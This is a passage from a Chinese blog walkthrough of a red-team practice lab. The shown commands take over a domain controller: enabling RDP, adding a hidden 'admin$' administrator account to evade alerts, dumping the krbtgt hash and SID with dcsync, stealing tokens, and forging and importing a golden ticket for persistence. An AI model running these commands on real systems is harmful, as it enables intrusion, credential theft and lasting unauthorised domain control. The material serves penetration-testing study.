+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run enum_logged_on_users -l</span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/qhwEvXM8W2jmHfQ.png" alt="image-20220121163527446" /></p>
+<h4 id="确定端口开放"><a class="markdownIt-Anchor" href="#确定端口开放"></a> 确定端口开放</h4>
+<p>前面我们在使用masscan扫描内网的时候已经知道了内网域控机是没有开启远程3389的、为了后面做准备我们还需要进行远程登录</p>
+<h3 id="登录远程桌面"><a class="markdownIt-Anchor" href="#登录远程桌面"></a> 登录远程桌面</h3>
+<h4 id="步骤"><a class="markdownIt-Anchor" href="#步骤"></a> 步骤</h4>
+<p>开启3389–&gt;制作system的影子用户–&gt;登录</p>
+<h4 id="开启3389"><a class="markdownIt-Anchor" href="#开启3389"></a> 开启3389</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">远程终端</span><br><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/rndBz5bWhOL36EH.png" alt="image-20220121164753430" /></p>
+<h4 id="制作影子用户"><a class="markdownIt-Anchor" href="#制作影子用户"></a> 制作影子用户</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user admin$ !@#123shell /add</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/FO8RtghYyeQ3kpb.png" alt="image-20220121170544373" /></p>
+<h4 id="登录"><a class="markdownIt-Anchor" href="#登录"></a> 登录</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop 10.10.10.149</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/T8WZJe2wnj4K7fA.png" alt="image-20220121170653527" /></p>
+<p>但是影子用户没有进入administractor的分组中</p>
+<h4 id="添加administractor分组"><a class="markdownIt-Anchor" href="#添加administractor分组"></a> 添加administractor分组</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators admini$ /add</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/94ildHZ8nRwWgej.png" alt="image-20220121170924329" /></p>
+<h4 id="成功登录"><a class="markdownIt-Anchor" href="#成功登录"></a> 成功登录</h4>
+<p><img src="https://s2.loli.net/2022/05/18/xt6NmOdy1SwPqZM.png" alt="image-20220121171017701" /></p>
+<p>虽然前面是已经知道administractor的用户密码、而我们不选择直接登录而是去制作影子用户、就是为了防止主机报警</p>
+<h3 id="域控维权"><a class="markdownIt-Anchor" href="#域控维权"></a> 域控维权</h3>
+<h4 id="制作黄金票据"><a class="markdownIt-Anchor" href="#制作黄金票据"></a> 制作黄金票据</h4>
+<p>黄金票据可以使我们永久的获取目标机器的控制权限、就算是主机密码修改、影子用户被删除、都可以保障我们能再次获得权限、</p>
+<p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4">制作过程</a></p>
+<h5 id="制作黄金票据需要的条件"><a class="markdownIt-Anchor" href="#制作黄金票据需要的条件"></a> 制作黄金票据需要的条件</h5>
+<h6 id="1域名称"><a class="markdownIt-Anchor" href="#1域名称"></a> 1.域名称</h6>
+<h6 id="2域的sid值"><a class="markdownIt-Anchor" href="#2域的sid值"></a> 2.域的SID值</h6>
+<h6 id="3域的krbtgt账户ntlm密码哈希"><a class="markdownIt-Anchor" href="#3域的krbtgt账户ntlm密码哈希"></a> 3.域的KRBTGT账户NTLM密码哈希</h6>
+<h6 id="4伪造用户名"><a class="markdownIt-Anchor" href="#4伪造用户名"></a> 4.伪造用户名</h6>
+<h5 id="步骤-2"><a class="markdownIt-Anchor" href="#步骤-2"></a> 步骤</h5>
+<p>清除之前的白银票据–&gt;导出krbtgt的Hash–&gt;生成Golden Ticket–&gt;导入伪造</p>
+<h5 id="清除白银票据"><a class="markdownIt-Anchor" href="#清除白银票据"></a> 清除白银票据</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">kerberos_ticket_purge</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/6Qh1pWFYgLRDcnt.png" alt="image-20220121172218578" /></p>
+<h5 id="导出krbtgt的hash-sid值"><a class="markdownIt-Anchor" href="#导出krbtgt的hash-sid值"></a> 导出krbtgt的Hash、SID值</h5>
+<h6 id="获取krbtgt的hash"><a class="markdownIt-Anchor" href="#获取krbtgt的hash"></a> 获取krbtgt的Hash</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+<h6 id="结果-3"><a class="markdownIt-Anchor" href="#结果-3"></a> 结果</h6>
+<p><img src="https://s2.loli.net/2022/05/18/w2VridqlYEtbCTc.png" alt="image-20220121173526828" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6f60ace6accbcb76078ccc0312174e98</span><br></pre></td></tr></table></figure>
+<h6 id="获取krbtgt的sid值"><a class="markdownIt-Anchor" href="#获取krbtgt的sid值"></a> 获取krbtgt的SID值</h6>
+<p>方法一</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">wmic useraccount where name=&quot;krbtgt&quot; get sid</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/Lr2mCMXd3wRflv7.png" alt="image-20220121174729570" /></p>
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount where name=&quot;krbtgt&quot; get sid</span><br><span class="line">SID</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-502</span><br></pre></td></tr></table></figure>
+<p>方法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/ZVztmrToxpiaSEN.png" alt="image-20220121175004489" /></p>
+<p>如果我们使用system权限没有办法获取的时候可以窃取一个administractor的进程来执行</p>
+<p>步骤</p>
+<p>先查看系统进程、找一个administractor的进程、然后记录其ID值、使用steal_token命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">steal_token ID</span><br><span class="line">getuid</span><br><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/4HZirg3zEDRtcSN.png" alt="image-20220121175445698" /></p>
+<h5 id="生成golden-ticket"><a class="markdownIt-Anchor" href="#生成golden-ticket"></a> 生成Golden Ticket</h5>
+<h6 id="制作"><a class="markdownIt-Anchor" href="#制作"></a> 制作</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create</span><br><span class="line"></span><br><span class="line">golden_ticket_create -d hackbox.com -u like4h -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /tmp/krbtgtlikr4h.ticket</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/6I3xhoORUp5LDXG.png" alt="image-20220121175953305" /></p>
+<h6 id="生成"><a class="markdownIt-Anchor" href="#生成"></a> 生成</h6>
+<p><img src="https://s2.loli.net/2022/05/18/hslMBQjvzT8NUXS.png" alt="image-20220121180058499" /></p>
+<h5 id="导入伪造"><a class="markdownIt-Anchor" href="#导入伪造"></a> 导入伪造</h5>
+<h6 id="导入"><a class="markdownIt-Anchor" href="#导入"></a> 导入</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">来到域控下的web主机</span><br><span class="line">kerberos_ticket_use /tmp/krbtgtlikr4h.ticket</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/5M9lyh8YZWRIOgS.png" alt="image-20220121180626174" /></p>
+<h6 id="尝试访问dc域控"><a class="markdownIt-Anchor" href="#尝试访问dc域控"></a> 尝试访问dc域控</h6>
+<p><img src="https://s2.loli.net/2022/05/18/KCLxAgOlfR9BmPn.png" alt="image-20220121180727216" /></p>
+<h2 id="00x9-写在最后"><a class="markdownIt-Anchor" href="#00x9-写在最后"></a> 00x9-写在最后</h2>
+<p>欢迎大家加入星球一起学习、里面有各种红队资源、工具、各种小技巧啊！</p>
+<p><img src="https://s2.loli.net/2022/05/18/ob3dl9ZVwQUfMGg.jpg" alt="星球" /></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">like4h</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/23/3679647319.html">http://example.com/2022/02/23/3679647319.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">like4h</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/">暗月渗透实战靶场</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/23/1823398161.html"><img class="prev-cover" src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">暗月渗透实战靶场-项目七</div></div></a></div><div class="next-post pull-right"><a href="/2022/02/23/842093410.html"><img class="next-cover" src="https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">暗月渗透实战靶场-项目八</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/02/23/3712695892.html" title="暗月渗透实战靶场-项目五"><img class="cover" src="https://s2.loli.net/2022/04/08/3sgAHoqV2mdCzU1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-23</div><div class="title">暗月渗透实战靶场-项目五</div></div></a></div><div><a href="/2022/02/23/1823398161.html" title="暗月渗透实战靶场-项目七"><img class="cover" src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-23</div><div class="title">暗月渗透实战靶场-项目七</div></div></a></div><div><a href="/2022/02/23/842093410.html" title="暗月渗透实战靶场-项目八"><img class="cover" src="https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-23</div><div class="title">暗月渗透实战靶场-项目八</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/index/avater.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">like4h</div><div class="author-info__description">心中有梦，眼里有光</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/like4h"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/like4h" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:flyingjq@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">like4h's Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-%E9%A1%B9%E7%9B%AE%E5%85%AD"><span class="toc-number">1.</span> <span class="toc-text"> 暗月渗透实战靶场-项目六</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text"> 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text"> 00x1-信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8masscan"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 使用masscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text"> nmap扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8whataweb%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99%E7%9A%84cms"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 使用whataweb查询网站的cms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 查询网站目录信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8dirsearch"><span class="toc-number">1.2.4.1.</span> <span class="toc-text"> 使用dirsearch</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8gobuster"><span class="toc-number">1.2.4.2.</span> <span class="toc-text"> 使用gobuster</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8dirmap"><span class="toc-number">1.2.4.3.</span> <span class="toc-text"> 使用dirmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x2-svn%E6%B3%84%E9%9C%B2%E5%B9%B6%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text"> 00x2-.svn泄露并利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 网站下载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x3-%E7%BD%91%E7%AB%99%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.4.</span> <span class="toc-text"> 00x3-网站审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wcdb%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text"> wc.db数据库查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 源码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E7%9A%84%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 网站的日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log%E6%97%A5%E5%BF%97%E9%81%8D%E5%8E%86-%E5%AF%BB%E6%89%BEpassword"><span class="toc-number">1.4.4.</span> <span class="toc-text"> log日志遍历-寻找password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86-%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.5.</span> <span class="toc-text"> 解密-登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x4-%E6%8B%BFshell-%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.</span> <span class="toc-text"> 00x4-拿shell-查看目标机信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 查看配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 尝试连接数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x5-msfcs%E5%86%B0%E8%9D%8E%E8%BF%9B%E8%A1%8Cwebshell%E7%9A%84%E4%BA%92%E8%81%94"><span class="toc-number">1.6.</span> <span class="toc-text"> 00x5-MSF+CS+冰蝎进行webshell的互联</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0cobaltstrikemsf"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 文件上传–&gt;cobaltstrike–&gt;msf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cobaltstrike%E7%9A%84getshell"><span class="toc-number">1.6.1.1.</span> <span class="toc-text"> cobaltstrike的getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.6.1.1.1.</span> <span class="toc-text"> 制作攻击载荷</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%96%87%E4%BB%B6%E5%B9%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.1.1.2.</span> <span class="toc-text"> 生成文件并上传</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-number">1.6.1.1.3.</span> <span class="toc-text"> 执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cs%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.6.1.1.4.</span> <span class="toc-text"> cs上线</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%86sessio%E8%BD%AC%E5%8F%91%E5%88%B0msf%E4%B8%8A%E8%BF%9B%E8%A1%8C%E4%BA%92%E8%81%94"><span class="toc-number">1.6.1.1.5.</span> <span class="toc-text"> 然后将sessio转发到msf上进行互联</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEmsf"><span class="toc-number">1.6.1.1.6.</span> <span class="toc-text"> 配置msf</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8cs%E4%B8%8A%E6%96%B0%E5%BB%BA%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">1.6.1.1.7.</span> <span class="toc-text"> 在cs上新建监听器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E7%AD%89%E5%BE%85msf%E4%B8%8A%E7%BA%BF%E5%8D%B3%E5%8F%AF"><span class="toc-number">1.6.1.1.8.</span> <span class="toc-text"> 然后等待msf上线即可</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8Emsfcs"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 冰蝎–&gt;msf–&gt;cs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0msfcs"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 文件上传–&gt;MSF–&gt;CS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x6-%E5%AF%B9%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.7.</span> <span class="toc-text"> 00x6-对目标机器进行信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%E5%9F%BA%E6%9C%AC%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 查看一下基本的信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%98%AF%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">1.7.1.1.</span> <span class="toc-text"> 首先是获取用户的密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%9A%84%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6"><span class="toc-number">1.7.1.2.</span> <span class="toc-text"> 查看其他配置及的证书文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x7-%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">1.8.</span> <span class="toc-text"> 00x7-域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%9F%9F"><span class="toc-number">1.8.1.</span> <span class="toc-text"> 发现域</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E4%BA%A4%E4%BA%92shell"><span class="toc-number">1.8.1.1.</span> <span class="toc-text"> 进入交互shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.8.1.2.</span> <span class="toc-text"> 查看网卡信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%9C%89%E4%B9%B1%E7%A0%81"><span class="toc-number">1.8.1.3.</span> <span class="toc-text"> 发现有乱码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%88%91%E4%BB%AC%E7%9C%8B%E5%88%B0%E4%B8%BB%E6%9C%BA%E7%9A%84dns%E8%A7%A3%E6%9E%90%E7%9A%84%E5%9C%B0%E5%9D%80%E6%9C%89%E4%B8%80%E4%B8%AAhackboxcom"><span class="toc-number">1.8.1.4.</span> <span class="toc-text"> 然后我们看到主机的DNS解析的地址有一个hackbox.com</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E7%9C%8B%E4%B8%80%E4%B8%8B%E7%BD%91%E5%8D%A1%E7%9A%84dns_server"><span class="toc-number">1.8.1.5.</span> <span class="toc-text"> 在看一下网卡的DNS_SERVER</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E5%85%B6%E4%BB%96%E7%9A%84%E5%B7%A5%E5%85%B7%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.8.1.6.</span> <span class="toc-text"> 用其他的工具查看</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%94%B6%E9%9B%86"><span class="toc-number">1.8.2.</span> <span class="toc-text"> 域收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F"><span class="toc-number">1.8.2.1.</span> <span class="toc-text"> 查看域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E7%9A%84%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.8.2.2.</span> <span class="toc-text"> 查看域内的主机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.8.2.3.</span> <span class="toc-text"> 查看域内工作组的信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7token"><span class="toc-number">1.8.2.4.</span> <span class="toc-text"> 获取域内用户token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87windows%E4%B8%8A%E7%99%BB%E5%BD%95%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">1.8.2.5.</span> <span class="toc-text"> 查看目标Windows上登录的用户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5dc%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.8.3.</span> <span class="toc-text"> 进入dc域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8msf%E4%B8%8A%E8%AE%BE%E7%BD%AE%E8%B7%AF%E7%94%B1"><span class="toc-number">1.8.3.1.</span> <span class="toc-text"> 在MSF上设置路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">1.8.3.2.</span> <span class="toc-text"> 设置代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.8.3.3.</span> <span class="toc-text"> 添加配置信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE"><span class="toc-number">1.8.3.4.</span> <span class="toc-text"> 然后尝试访问</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.8.4.</span> <span class="toc-text"> 扫描内网域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#masscan%E6%89%AB%E6%8F%8F"><span class="toc-number">1.8.4.1.</span> <span class="toc-text"> masscan扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8nmap%E8%BF%9B%E8%A1%8C%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.8.4.2.</span> <span class="toc-text"> 使用nmap进行探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%BC%80%E6%94%BE%E7%9A%84%E6%9C%89445%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.8.4.3.</span> <span class="toc-text"> 发现开放的有445端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%89%93%E5%9F%9F%E6%8E%A7"><span 